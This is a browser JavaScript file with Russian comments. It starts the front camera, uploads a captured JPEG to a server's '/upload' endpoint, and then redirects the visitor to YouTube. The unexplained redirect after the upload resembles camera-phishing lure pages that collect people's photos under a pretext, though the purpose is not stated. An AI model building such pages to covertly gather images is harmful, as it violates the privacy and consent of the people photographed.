document.addEventListener('DOMContentLoaded', async () => {
  const camera = document.getElementById('camera');
  const captureBtn = document.getElementById('captureBtn');
  const statusDiv = document.getElementById('status');
  const loader = document.getElementById('loader');
  
  // Быстрая инициализация камеры с минимальными проверками
  const initCamera = async () => {
    try {
      // Показываем индикатор загрузки
      loader.style.display = 'block';
      statusDiv.textContent = 'Подождите 3 секунды';
      
      // Минимальные проверки перед запуском
      if (!navigator.mediaDevices?.getUserMedia) {
        throw new Error('Браузер не поддерживает доступ к камере');
      }

      // Быстрый старт с базовыми настройками
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: {
          width: { ideal: 640 },  // Уменьшенное разрешение для быстрого старта
          height: { ideal: 480 },
          facingMode: 'user'       // Приоритет фронтальной камеры
        },
        audio: false
      });

      camera.srcObject = stream;
      camera.onloadedmetadata = () => {
        camera.play();
        loader.style.display = 'none';
        statusDiv.textContent = 'Пропускайте';
        captureBtn.disabled = false;
      };
      
    } catch (err) {
      loader.style.display = 'none';
      statusDiv.textContent = `Ошибка: ${err.message}`;
      console.error('Camera init error:', err);
      
      // Пробуем альтернативные настройки
      try {
        const backupStream = await navigator.mediaDevices.getUserMedia({ video: true });
        camera.srcObject = backupStream;
        statusDiv.textContent = 'Камера готова (режим по умолчанию)';
        captureBtn.disabled = false;
      } catch (backupErr) {
        statusDiv.textContent = 'Не удалось подключить камеру';
      }
    }
  };

  // Запускаем инициализацию
  initCamera();

  // Обработчик кнопки съемки
  captureBtn.addEventListener('click', async () => {
    captureBtn.disabled = true;
    statusDiv.textContent = '';
    
    try {
      const canvas = document.createElement('canvas');
      canvas.width = camera.videoWidth;
      canvas.height = camera.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(camera, 0, 0);
      
      canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append('photo', blob, 'photo.jpg');
        
        const response = await fetch('/upload', {
          method: 'POST',
          body: formData
        });
        
        const result = await response.json();
        if (result.success) {
          window.location.href = 'https://www.youtube.com/';
        }
      }, 'image/jpeg', 0.85);
    } catch (err) {
      statusDiv.textContent = 'Ошибка: ' + err.message;
      captureBtn.disabled = false;
    }
  });
});